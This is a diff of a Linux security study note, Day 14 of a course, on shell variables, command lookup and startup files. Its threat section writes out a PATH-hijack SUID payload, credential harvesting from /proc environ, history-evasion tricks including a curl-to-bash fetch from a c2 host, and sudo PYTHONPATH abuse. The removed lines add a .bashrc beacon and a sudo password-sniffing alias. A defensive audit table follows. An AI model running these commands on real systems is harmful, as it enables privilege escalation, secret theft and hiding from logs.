@@ -3,210 +3,219 @@
    AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
    TRACK: 42-Month Systems & Cyber Operations Research
    MODULE: Month 01 — Linux Kernel Interface & Core CLI
-   DOCUMENT: Day 14 — Shell Environment, Command Resolution & Threat Vectors
+   DOCUMENT: Day 14 — Shell Environment, Variable Scope & Command Resolution
    ========================================================================= -->
 
-# 🛡️ Day 14: Shell Environment, Command Resolution & Threat Vectors
+# 🛡️ Day 14: Shell Environment, Variable Scope & Command Resolution
 
 > **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
 > *Author: Muhammad Imran (@iwcyberops)*  
-> *Track: Shell State Architecture, Lookup Mechanics, Environment Abuse & Evasion*
+> *Track: Shell State Architecture, Lookup Hierarchy, Path Hijacking & Memory Recon*
 
 ---
 
-## 1. Shell State & Variable Architecture
+## 1. Shell Variable Scope & Memory Inheritance
 
-Variables in Linux reside either in **Local Shell Scope** (restricted to the current shell instance) or in the **Global Environment Space** (exported to all child processes spawned by the parent shell).
-
-```
- ┌────────────────────────────────────────────────────────┐
- │            PARENT SHELL INSTANCE (PID 1000)            │
- │                                                        │
- │   LOCAL_VAR="secret"         EXPORTED_VAR="active"     │
- │   (Not passed to child)      (Exported to environment) │
- └──────────────────────────┬─────────────────────────────┘
-                            │  [ fork() & execve() ]
-                            ▼
- ┌────────────────────────────────────────────────────────┐
- │             CHILD PROCESS (PID 1001)                   │
- │                                                        │
- │   LOCAL_VAR: [ NULL ]        EXPORTED_VAR: "active"    │
- └────────────────────────────────────────────────────────┘
-```
-
-### Variable Scoping & Management Commands
-
-* `VAR="value"` — Define a local shell variable (not inherited by subshells).
-* `export VAR="value"` — Export variable to the global environment table.
-* `declare -x VAR="value"` — Alternative syntax to mark a variable for export.
-* `declare -r SECURE_KEY="1337"` — Define a **Read-Only** variable (cannot be modified or unset).
-* `unset VAR_NAME` — Remove variable from memory.
-* `env` / `printenv` — Print all currently exported environment variables.
-* `set` — Print all variables (local, exported, and internal shell functions).
-
----
-
-## 2. The 6-Stage Command Resolution Pipeline
-
-When a command is executed in the terminal, the shell resolves its identity through a strict 6-stage lookup hierarchy before querying physical storage.
+When a shell initializes, it allocates an internal memory space for variables. These variables exist in two distinct scopes: **Local Shell Variables** and **Exported Environment Variables**.
 
 ```
-       [ Input: "command" ]
-               │
-               ▼
-     1. [ Alias Check ]          ──( Found )──> Execute Alias
-               │ (No match)
-               ▼
-     2. [ Reserved Keywords ]    ──( Found )──> Execute (if, for, while, do)
-               │ (No match)
-               ▼
-     3. [ Shell Functions ]      ──( Found )──> Execute in-memory function
-               │ (No match)
-               ▼
-     4. [ Shell Built-in ]       ──( Found )──> Execute directly in shell (cd, echo, pwd)
-               │ (No match)
-               ▼
-     5. [ Hash Table Cache ]     ──( Found )──> Execute previously resolved path directly
-               │ (No match)
-               ▼
-     6. [ $PATH Binary Lookup ]  ──( Found )──> Execute binary & save to Hash Table
-               │ (Not found)
-               ▼
-     [ ERROR: Command Not Found ]
+  ┌────────────────────────────────────────────────────────┐
+  │              PARENT PROCESS (Current Shell)            │
+  │  - Local Var:      SECRET="123"  (Isolated)            │
+  │  - Exported Var:   export API="xyz"                    │
+  └──────────────────────────┬─────────────────────────────┘
+                             │  fork() / execve()
+                             ▼
+  ┌────────────────────────────────────────────────────────┐
+  │              CHILD PROCESS (Subshell / Script)         │
+  │  - Reads:  API="xyz"         (Inherited from Parent)   │
+  │  - Cannot: Access $SECRET    (Local variables drop)    │
+  │  - Cannot: Modify Parent state (One-way inheritance)   │
+  └────────────────────────────────────────────────────────┘
 ```
 
-### Command Identification & Cache Diagnostics
+### Scope Comparison & Management
+
+| Variable Type | Scope Boundary | Persistence | Management Commands |
+| :--- | :--- | :--- | :--- |
+| **Local Variable** | Current active shell session only | Lost upon process exit | `VAR="val"` (Set), `set` (List) |
+| **Environment Var**| Passed to all child subshells & binaries | Active across child processes | `export VAR="val"`, `env` (List) |
 
 ```bash
-# 1. Precise Resolution Probing (type)
-type -a ls                            # Inspect all definitions (aliases, builtins, paths)
-type -t cd                            # Print type classification ('builtin', 'alias', 'file')
+# 1. Local vs Exported Demonstration
+TARGET="10.10.10.50"                  # Local Variable
+export DOMAIN="corp.local"            # Environment Variable
 
-# 2. Path & Binary Locators
-which nmap                            # Scan $PATH and return first matching executable
-whereis bash                          # Return binary, source, and man page locations
+bash -c 'echo "Target: $TARGET | Domain: $DOMAIN"'
+# Output: Target:  | Domain: corp.local (Local variable fails to pass to child)
 
-# 3. Hash Table Management (hash)
-hash                                  # Display cache of resolved command paths in current session
-hash -r                               # Clear the hash cache table (forces fresh $PATH lookup)
+# 2. Variable Deletion & Inspection
+unset DOMAIN                          # Remove variable from shell memory
+env                                   # Print all exported environment variables
+printenv PATH                         # Print specific environment variable
 ```
 
 ---
 
-## 3. Shell Startup Files & Initialization Flow
+## 2. Command Resolution Hierarchy (Lookup Sequence)
 
-Configuration files are sourced sequentially based on the session execution mode:
-
-```
-┌────────────────────────────────────────────────────────────────────────┐
-│                      SHELL EXECUTION MODES                             │
-├──────────────────────────┬─────────────────────────────────────────────┤
-│ Interactive Login        │ SSH login, Console login (`su - user`)      │
-│ Interactive Non-Login    │ New terminal window / Subshell (`bash`)     │
-│ Non-Interactive          │ Automated shell script execution (`./run.sh`)│
-└──────────────────────────┴─────────────────────────────────────────────┘
-```
-
-### Execution Loading Hierarchy
+When an operator inputs a command string (e.g., `test`), the Linux shell does **not** check the filesystem immediately. It evaluates commands through a strict **5-stage resolution pipeline**:
 
 ```
-[ Interactive Login ]     ──> /etc/profile ──> ~/.bash_profile ──> ~/.bashrc ──> /etc/bash.bashrc
-[ Interactive Non-Login ] ──> ~/.bashrc    ──> /etc/bash.bashrc
-[ Shell Termination ]     ──> ~/.bash_logout
+                       [ USER TYPES COMMAND ]
+                                  │
+                                  ▼
+                     ┌──────────────────────────┐
+                     │ 1. Shell Aliases         │ ──( Match Found )──> [ Execute Alias ]
+                     └────────────┬─────────────┘
+                                  │ No
+                                  ▼
+                     ┌──────────────────────────┐
+                     │ 2. Reserved Keywords     │ ──( Match Found )──> [ Execute Syntax (if/for) ]
+                     └────────────┬─────────────┘
+                                  │ No
+                                  ▼
+                     ┌──────────────────────────┐
+                     │ 3. Shell Functions       │ ──( Match Found )──> [ Execute Function ]
+                     └────────────┬─────────────┘
+                                  │ No
+                                  ▼
+                     ┌──────────────────────────┐
+                     │ 4. Shell Built-ins       │ ──( Match Found )──> [ Execute Kernel Subroutine ]
+                     └────────────┬─────────────┘
+                                  │ No
+                                  ▼
+                     ┌──────────────────────────┐
+                     │ 5. $PATH Binary Search   │ ──( Left to Right )─> [ Execute Binary / 127 Error ]
+                     └──────────────────────────┘
+```
+
+### Command Inspection Primitives
+
+```bash
+# Determine how the shell interprets a specific command name
+type -a ls
+# Output:
+# ls is aliased to `ls --color=auto`
+# ls is /usr/bin/ls
+
+type -t cd                            # Output: builtin
+type -t if                            # Output: keyword
+command -v nmap                       # Fast binary resolution (POSIX standard for scripts)
 ```
 
 ---
 
-## 4. Critical Diagnostic & Security Variables
+## 3. Shell Startup & Profile Initialization Order
 
-| Variable | Definition | Security & Operational Relevance |
+Startup scripts configure the shell environment. Attackers target these files to gain persistence, capture credentials, or tamper with runtime commands.
+
+```
+       [ Interactive Login Shell ]                      [ Interactive Non-Login Shell ]
+       (e.g., SSH login, console /bin/login)            (e.g., Spawning terminal in GUI / Subshell)
+                   │                                                   │
+                   ▼                                                   ▼
+       ┌────────────────────────┐                             ┌────────────────────────┐
+       │   /etc/profile         │                             │   /etc/bash.bashrc     │
+       └───────────┬────────────┘                             └───────────┬────────────┘
+                   │                                                      │
+                   ▼                                                      ▼
+       ┌────────────────────────┐                             ┌────────────────────────┐
+       │   ~/.bash_profile      │                             │   ~/.bashrc            │
+       │   (or ~/.profile)      │                             └────────────────────────┘
+       └───────────┬────────────┘
+                   │
+                   ▼
+       ┌────────────────────────┐
+       │   ~/.bashrc            │
+       └────────────────────────┘
+```
+
+---
+
+## 4. Core System Environment Variables
+
+| Variable | System Definition | Security / Operational Focus |
 | :--- | :--- | :--- |
-| `$PATH` | Colon-separated directory list for binary search | High-value target for privilege escalation & hijacking |
-| `$IFS` | Internal Field Separator (Default: space/tab/newline)| String-tokenization control; input parsing manipulation |
-| `$HISTFILE` | Target log file for shell command history | Session monitoring evasion (`$HISTFILE=/dev/null`) |
-| `$HISTCONTROL`| Directives for history logging (`ignorespace`) | Hiding commands from audit logs using a leading space |
-| `$PROMPT_COMMAND`| Command executed immediately prior to rendering `$PS1` | In-memory keystroke logging and persistent execution |
-| `$LD_PRELOAD`| Libraries loaded before standard system libraries | Userland rootkit injection & API hooking |
+| `$PATH` | Colon-delimited directory search path | Primary target for Binary Hijacking & DLL-style attacks |
+| `$IFS` | Internal Field Separator (Space/Tab/Newline) | Modifying `$IFS` breaks string parsers in privileged scripts |
+| `$PROMPT_COMMAND`| Command executed before displaying shell prompt | Covert persistence & terminal keystroke logging hook |
+| `$HISTFILE` | Location where terminal history is written | Setting to `/dev/null` evades forensic session logs |
+| `$LD_PRELOAD` | Shared library loaded before system libs | Rootkit hook & API function interception |
+| `$SHELLOPTS` | Read-only list of active shell options | Auditing restricted shell environments (`rbash`) |
 
 ---
 
-## 5. Cyber Operations & Threat Vectors (Hacker Mindset)
+## 5. Threat Operations & Hacker Tradecraft
 
-Environment variables and command resolution routines are prime surfaces for execution hijacking, reconnaissance, and anti-forensics.
-
----
-
-### Vector 1: `$PATH` Hijacking (Local Privilege Escalation)
-If a high-privileged script or cronjob calls an executable using a **relative name** (e.g., `backup` instead of `/usr/bin/backup`), an attacker with write access to an early entry in `$PATH` can redirect execution.
+### Vector 1: `$PATH` Hijacking & Binary Planting
+If `$PATH` contains relative directories (e.g., `.`), world-writable paths (`/tmp`), or if an administrator places custom scripts before standard paths (`/usr/local/bin:/usr/bin`):
 
 ```bash
-# Scenario: An admin script executes 'service restart' without full path.
-# Step 1: Prepend a world-writable directory to current $PATH
-export PATH=/tmp/evil_bin:$PATH
+# Current PATH: /tmp:/usr/local/bin:/usr/bin:/bin
 
-# Step 2: Drop weaponized payload named 'service' in /tmp/evil_bin
-mkdir -p /tmp/evil_bin
-echo '#!/bin/bash' > /tmp/evil_bin/service
-echo 'chmod +s /bin/bash' >> /tmp/evil_bin/service
-chmod +x /tmp/evil_bin/service
+# Scenario: SUID binary or administrative script executes 'service apache2 restart'
+# (Fails to specify absolute path '/usr/sbin/service')
 
-# Step 3: When the script executes 'service', the shell finds /tmp/evil_bin/service FIRST.
+# Adversary drops payload into /tmp:
+echo '#!/bin/bash' > /tmp/service
+echo 'chmod +s /bin/bash' >> /tmp/service
+chmod +x /tmp/service
+
+# Execution: When 'service' is called, shell resolves /tmp/service first!
 ```
 
 ---
 
-### Vector 2: History Sanitization & Anti-Forensics
-During engagements, operators prevent active sessions from writing traces to disk:
+### Vector 2: Live Memory Credential Harvesting (`/proc`)
+Environment variables often contain sensitive API keys, database passwords, and tokens. These remain unencrypted in kernel process memory:
 
 ```bash
-# Method A: Direct File Redirection
-export HISTFILE=/dev/null
+# Dump environment variables of an active process
+cat /proc/<PID>/environ | tr '\0' '\n'
 
-# Method B: In-Memory History Suppression
+# Search all running processes for exposed tokens:
+grep -Ea "AWS_SECRET|API_KEY|DB_PASS|TOKEN" /proc/*/environ 2>/dev/null
+```
+
+---
+
+### Vector 3: Anti-Forensic Shell Operations
+Adversaries detach command logging by manipulating shell environment variables during live sessions:
+
+```bash
+# 1. Disable History Logging for Current Session
+export HISTFILE=/dev/null
+export HISTSIZE=0
 set +o history
 
-# Method C: Leading Space Evasion (Requires HISTCONTROL=ignorespace)
-# Prefixing any command with a single space skips history recording:
- whoami
+# 2. Leading Space Trick (If HISTCONTROL=ignorespace is enabled)
+ echo "curl http://c2.local/payload.sh | bash"  # Space at start prevents history save
 ```
 
 ---
 
-### Vector 3: Memory Credential Harvesting via `/proc`
-Processes often inherit cleartext API tokens, database passwords, and runtime secrets inside their environment blocks:
+### Vector 4: Sudo Environment Preservation Abuse (`env_keep`)
+When running `sudo`, security controls usually strip user environment variables to prevent privilege escalation. However, if `/etc/sudoers` contains `env_keep += "PYTHONPATH"` or `env_keep += "LD_PRELOAD"`:
 
 ```bash
-# Step 1: Target a sensitive running process PID
-pgrep -f "python3 app.py"
-
-# Step 2: Read process environment directly from kernel memory
-cat /proc/<PID>/environ | tr '\0' '\n' | grep -iE "(key|token|pass|secret)"
+# Exploit: Hijack python module loading under sudo
+export PYTHONPATH=/tmp/evil_modules
+sudo python3 /opt/admin_script.py
+# -> Loads /tmp/evil_modules/__init__.py as ROOT
 ```
 
 ---
 
-### Vector 4: Startup File Poisoning (Persistence & Backdoors)
-Adversaries append commands to persistent user profile files (`~/.bashrc`, `~/.profile`):
+## 6. Defensive Threat Hunting & Auditing Matrix
 
-```bash
-# Append an automated beacon triggered on every interactive login
-echo 'nohup /tmp/.agent >/dev/null 2>&1 &' >> ~/.bashrc
-
-# Sudo Password Sniffing Alias:
-echo 'alias sudo="read -s -p \"[sudo] password for $USER: \" pass; echo; echo \$pass >> /tmp/.pass; sudo -k; /usr/bin/sudo -S <<< \$pass"' >> ~/.bashrc
-```
-
----
-
-## 6. Defensive Threat Hunting & Resolution Matrix
-
-| Objective | Command / Triage Syntax | Threat / Defensive Focus |
+| Tactical Objective | Auditing Command Syntax | Detection Goal |
 | :--- | :--- | :--- |
-| **Audit `$PATH` for Relative Paths** | `echo $PATH \| grep -E "(^\.|:\.:|:\.$)"` | Detects dangerous current-directory `.` in PATH |
-| **Audit Writable Paths in `$PATH`** | `find $(echo $PATH \| tr ':' ' ') -maxdepth 0 -perm -0002` | Discovers directories vulnerable to binary injection |
-| **Check Active Aliases** | `alias` | Detects backdoored or hijacked command aliases |
-| **Inspect System-Wide Profiles** | `ls -la /etc/profile.d/ /etc/bash.bashrc` | Identifies unauthorized system-wide persistent scripts |
-| **Audit Session Environment Dumps**| `env \| grep -iE "(proxy|http|ssh|auth)"` | Unmasks exfiltration proxies or leaked credentials |
+| **Audit Unsafe `$PATH` Entries** | `echo "$PATH" \| grep -E "(^\|:)(\.\|/tmp)($\|:)"` | Detects relative or writable paths in search tree |
+| **Detect Alias Poisoning** | `alias` | Identifies hijacked standard commands (`ls`, `sudo`) |
+| **Audit Function Hijacking**| `declare -F` | Lists loaded shell functions overriding binaries |
+| **Detect `$PROMPT_COMMAND` Hook**| `echo "$PROMPT_COMMAND"` | Identifies hidden session persistence triggers |
+| **Check Sudo Environment Rules**| `sudo -l` | Verifies exposed `env_keep` or `SETENV` capabilities |
 
 ---
 
